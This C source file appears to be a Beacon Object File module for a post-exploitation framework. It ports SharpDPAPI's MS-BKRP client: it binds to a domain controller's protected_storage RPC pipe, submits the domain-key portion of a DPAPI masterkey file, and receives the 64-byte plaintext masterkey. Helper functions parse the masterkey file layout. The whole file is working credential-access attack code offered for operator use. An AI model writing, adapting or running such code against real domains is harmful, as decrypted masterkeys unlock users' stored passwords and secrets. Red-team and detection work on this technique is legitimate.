/*
 * bkrp.c — MS-BKRP (BackupKey Remote Protocol) client
 *
 * Ports SharpDPAPI/lib/Bkrp.cs to C for BOF usage.
 * Uses raw NdrClientCall2 with precomputed MIDL format strings
 * to call the BackuprKey RPC method on a domain controller.
 *
 * The DC decrypts the domain key portion of a masterkey file
 * and returns the 64-byte plaintext masterkey.
 *
 * References:
 *   - Mimikatz: kull_m_rpc_ms-bkrp_c.c
 *   - SharpDPAPI: lib/Bkrp.cs
 *   - MS-BKRP spec: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp
 */
#include "beacon.h"
#include "bofdefs.h"
#include "bkrp.h"
#include "helpers.h"

/* ============================================================
 * RPC structures — use MinGW's built-in definitions.
 * Only define our own convenience alias for RPC_SECURITY_QOS.
 * ============================================================ */

#include <rpcdce.h>
#include <rpcdcep.h>
#include <rpcndr.h>

typedef RPC_SECURITY_QOS RPC_SECURITY_QOS_BKRP;

/* ---- MIDL proc/type format strings (x64) ----
 * These are pre-compiled NDR format strings for the BackuprKey RPC call.
 * Copied directly from SharpDPAPI/Bkrp.cs MIDL_ProcFormatStringBackuprKeyx64
 */
static BYTE MIDL_ProcFormatString_x64[] = {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x54, 0x00,
    0x24, 0x00, 0x47, 0x07, 0x0a, 0x07, 0x01, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x01,
    0x08, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x10, 0x00,
    0x1c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00,
    0x13, 0x20, 0x20, 0x00, 0x28, 0x00, 0x50, 0x21,
    0x28, 0x00, 0x08, 0x00, 0x48, 0x00, 0x30, 0x00,
    0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00,
    0x00
};

static BYTE MIDL_TypeFormatString_x64[] = {
    0x00, 0x00, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x00,
    0x08, 0x00, 0x01, 0x5b, 0x15, 0x03, 0x10, 0x00,
    0x08, 0x06, 0x06, 0x4c, 0x00, 0xf1, 0xff, 0x5b,
    0x11, 0x00, 0x02, 0x00, 0x1b, 0x00, 0x01, 0x00,
    0x29, 0x00, 0x18, 0x00, 0x00, 0x00, 0x01, 0x5b,
    0x11, 0x14, 0x02, 0x00, 0x12, 0x00, 0x02, 0x00,
    0x1b, 0x00, 0x01, 0x00, 0x29, 0x54, 0x28, 0x00,
    0x00, 0x00, 0x01, 0x5b, 0x11, 0x0c, 0x08, 0x5c,
    0x00
};

/* ---- GUIDs ---- */

/* BACKUPKEY_RESTORE_GUID: {47270C64-2FC7-499B-AC5B-0E37CDCE899A} */
static const GUID BACKUPKEY_RESTORE_GUID = {
    0x47270C64, 0x2FC7, 0x499B,
    { 0xAC, 0x5B, 0x0E, 0x37, 0xCD, 0xCE, 0x89, 0x9A }
};

/* MS_BKRP_INTERFACE_ID: {3DDE7C30-165D-11D1-AB8F-00805F14DB40} */
static const GUID MS_BKRP_INTERFACE_ID = {
    0x3DDE7C30, 0x165D, 0x11D1,
    { 0xAB, 0x8F, 0x00, 0x80, 0x5F, 0x14, 0xDB, 0x40 }
};

/* NDR transfer syntax GUID */
static const GUID IID_NDR = {
    0x8A885D04, 0x1CEB, 0x11C9,
    { 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60 }
};

/* ============================================================
 * Memory allocation callbacks for NDR runtime
 * ============================================================ */
static void* __RPC_USER bkrp_alloc(size_t size) {
    return intAlloc((int)size);
}

static void __RPC_USER bkrp_free(void* ptr) {
    if (ptr) intFree(ptr);
}

/* ============================================================
 * RPC Binding
 * ============================================================ */
static void* bkrp_bind(const wchar_t* server) {
    wchar_t* binding_str = NULL;
    void* binding = NULL;
    INT32 status;

    /* Compose: ncacn_np:server[\pipe\protected_storage] */
    status = RPCRT4$RpcStringBindingComposeW(
        NULL,
        (LPWSTR)L"ncacn_np",
        (LPWSTR)server,
        (LPWSTR)L"\\pipe\\protected_storage",
        NULL,
        &binding_str);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[BKRP] RpcStringBindingCompose failed: 0x%08X", status);
        return NULL;
    }

    status = RPCRT4$RpcBindingFromStringBindingW(binding_str, &binding);
    RPCRT4$RpcStringFreeW(&binding_str);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[BKRP] RpcBindingFromStringBinding failed: 0x%08X", status);
        return NULL;
    }

    /* Set auth info — negotiate with mutual auth */
    wchar_t spn[256];
    swprintf(spn, L"ProtectedStorage/%s", server);

    RPC_SECURITY_QOS_BKRP qos;
    memset(&qos, 0, sizeof(qos));
    qos.Version = 1;
    qos.Capabilities = 8;       /* mutual auth */
    qos.ImpersonationType = 3;  /* impersonate */

    status = RPCRT4$RpcBindingSetAuthInfoExW(
        binding,
        spn,
        6,      /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */
        9,      /* RPC_C_AUTHN_GSS_NEGOTIATE */
        NULL,   /* use current credentials */
        0,      /* RPC_C_AUTHZ_NONE */
        &qos);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[BKRP] RpcBindingSetAuthInfoEx failed: 0x%08X", status);
        RPCRT4$RpcBindingFree(&binding);
        return NULL;
    }

    return binding;
}

/* ============================================================
 * bkrp_decrypt_masterkey — Main RPC call
 * ============================================================ */
BOOL bkrp_decrypt_masterkey(const wchar_t* dc_name,
                            const BYTE* domain_key, int dk_len,
                            BYTE* out_key, int* out_key_len) {

    if (!dc_name || !domain_key || dk_len <= 0 || !out_key || !out_key_len) {
        BeaconPrintf(CALLBACK_ERROR, "[BKRP] Invalid parameters");
        return FALSE;
    }

    /* 1. Bind to DC */
    void* hBind = bkrp_bind(dc_name);
    if (!hBind) {
        return FALSE;
    }

    /* 2. Build the MIDL_STUB_DESC */
    RPC_CLIENT_INTERFACE client_iface;
    memset(&client_iface, 0, sizeof(client_iface));
    client_iface.Length = sizeof(RPC_CLIENT_INTERFACE);
    client_iface.InterfaceId.SyntaxGUID = MS_BKRP_INTERFACE_ID;
    client_iface.InterfaceId.SyntaxVersion.MajorVersion = 1;
    client_iface.InterfaceId.SyntaxVersion.MinorVersion = 0;
    client_iface.TransferSyntax.SyntaxGUID = IID_NDR;
    client_iface.TransferSyntax.SyntaxVersion.MajorVersion = 2;
    client_iface.TransferSyntax.SyntaxVersion.MinorVersion = 0;

    COMM_FAULT_OFFSETS fault_offsets;
    fault_offsets.CommOffset = -1;
    fault_offsets.FaultOffset = -1;

    MIDL_STUB_DESC stub_desc;
    memset(&stub_desc, 0, sizeof(stub_desc));
    stub_desc.RpcInterfaceInformation = &client_iface;
    stub_desc.pfnAllocate = bkrp_alloc;
    stub_desc.pfnFree = bkrp_free;
    stub_desc.pFormatTypes = MIDL_TypeFormatString_x64;
    stub_desc.fCheckBounds = 1;
    stub_desc.Version = 0x60000;
    stub_desc.MIDLVersion = 0x8000253;
    stub_desc.CommFaultOffsets = &fault_offsets;
    stub_desc.mFlags = 0x00000001;

    /* 3. Make the NdrClientCall2 to BackuprKey */
    void* ppDataOut = NULL;
    void* pcbDataOut = NULL;
    UINT32 dwParams = 0;
    BOOL success = FALSE;

    /* NdrClientCall2 — no SEH in MinGW GCC, just call directly */
    RPCRT4$NdrClientCall2(
        &stub_desc,
        MIDL_ProcFormatString_x64,
        hBind,
        (void*)&BACKUPKEY_RESTORE_GUID,
        (void*)domain_key,
        (UINT32)dk_len,
        &ppDataOut,
        &pcbDataOut,
        dwParams);

    if (ppDataOut) {
        /*
         * The response is: 4 bytes (version?) + 64 bytes (masterkey)
         * SharpDPAPI:
         *   IntPtr ptr = new IntPtr(ppDataOut.ToInt64() + 4);
         *   Marshal.Copy(ptr, managedArray, 0, 64);
         */
        BYTE* key_ptr = (BYTE*)ppDataOut + 4;
        memcpy(out_key, key_ptr, 64);
        *out_key_len = 64;
        success = TRUE;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[BKRP] NdrClientCall2 returned NULL data");
    }

    /* 4. Cleanup */
    if (ppDataOut) bkrp_free(ppDataOut);
    RPCRT4$RpcBindingFree(&hBind);

    return success;
}

/* ============================================================
 * dpapi_get_domain_key — Extract domain key from masterkey blob
 * ============================================================ */
BOOL dpapi_get_domain_key(const BYTE* mk_bytes, int mk_len,
                          BYTE** out_dk, int* out_dk_len) {
    /*
     * Masterkey file layout:
     *   offset 0:   header (96 bytes)
     *   offset 96:  QWORD masterKeyLen
     *   offset 104: QWORD backupKeyLen
     *   offset 112: QWORD credHistLen
     *   offset 120: QWORD domainKeyLen
     *   then: [masterKey][backupKey][credHist][domainKey]
     */
    if (!mk_bytes || mk_len < 128 || !out_dk || !out_dk_len) {
        return FALSE;
    }

    int offset = 96;

    UINT64 masterKeyLen = *(UINT64*)(mk_bytes + offset); offset += 8;
    UINT64 backupKeyLen = *(UINT64*)(mk_bytes + offset); offset += 8;
    UINT64 credHistLen  = *(UINT64*)(mk_bytes + offset); offset += 8;
    UINT64 domainKeyLen = *(UINT64*)(mk_bytes + offset); offset += 8;

    /* Skip past masterkey + backupkey + credhist */
    offset += (int)(masterKeyLen + backupKeyLen + credHistLen);

    if (domainKeyLen == 0 || offset + (int)domainKeyLen > mk_len) {
        return FALSE;
    }

    BYTE* dk = (BYTE*)intAlloc((int)domainKeyLen);
    if (!dk) return FALSE;

    memcpy(dk, mk_bytes + offset, (int)domainKeyLen);
    *out_dk = dk;
    *out_dk_len = (int)domainKeyLen;

    return TRUE;
}

/* ============================================================
 * dpapi_get_masterkey_guid — Extract GUID string from masterkey blob
 * ============================================================ */
BOOL dpapi_get_masterkey_guid(const BYTE* mk_bytes, int mk_len, char* guid_str) {
    /*
     * The GUID is a Unicode string at offset 12, 72 bytes long (36 wchar_t).
     * Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
     * We wrap it in braces: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
     */
    if (!mk_bytes || mk_len < 84 || !guid_str) {
        return FALSE;
    }

    wchar_t* guid_wide = (wchar_t*)(mk_bytes + 12);
    /* 72 bytes = 36 wchar_t */

    guid_str[0] = '{';
    for (int i = 0; i < 36; i++) {
        guid_str[i + 1] = (char)guid_wide[i];
    }
    guid_str[37] = '}';
    guid_str[38] = '\0';

    return TRUE;
}
